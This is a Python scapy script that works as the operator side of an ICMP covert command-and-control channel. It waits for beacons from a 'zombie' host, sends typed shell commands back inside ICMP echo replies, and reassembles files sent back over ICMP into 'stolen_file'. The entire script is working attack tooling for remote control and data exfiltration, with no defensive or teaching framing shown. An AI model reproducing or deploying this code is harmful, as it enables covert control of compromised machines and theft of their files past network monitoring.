from scapy.all import sr,IP,ICMP,Raw,sniff,send
from multiprocessing import Process
import os
import base64

command_i_sent = ""
file_val = bytes()

def sniffer():
    print("Start sniffing")
    sniff(iface="enp0s3", prn=cmd, filter="icmp and not icmp[0] == 3 and src host not 10.0.0.14", store=0)


def cmd(packet):
    global command_i_sent
    global file_val

    if command_i_sent.startswith("send"):

        try:
            if (packet[Raw].load).decode('utf-8') != "done":
                file_val += packet[Raw].load

            else:
                with open("stolen_file", "wb") as file:
                    file.write(file_val)
                    command_i_sent = ""
                
        except:
            file_val += packet[Raw].load


    else:
        if (packet[Raw].load).decode('utf-8') == "Beacon from zombie":
            command_i_sent = input("run command: ")
            reply_packet = IP(dst=packet[IP].src) / ICMP(type=0, id=packet[ICMP].id) / Raw(load=command_i_sent)
            send(reply_packet, verbose=0)
        elif packet[ICMP].type == 8: 
            if command_i_sent.startswith("ls"):
                string = packet[Raw].load.decode('utf-8')
                print(string)
    

            
def main():

    sniffer()


if __name__ == "__main__":
    main()
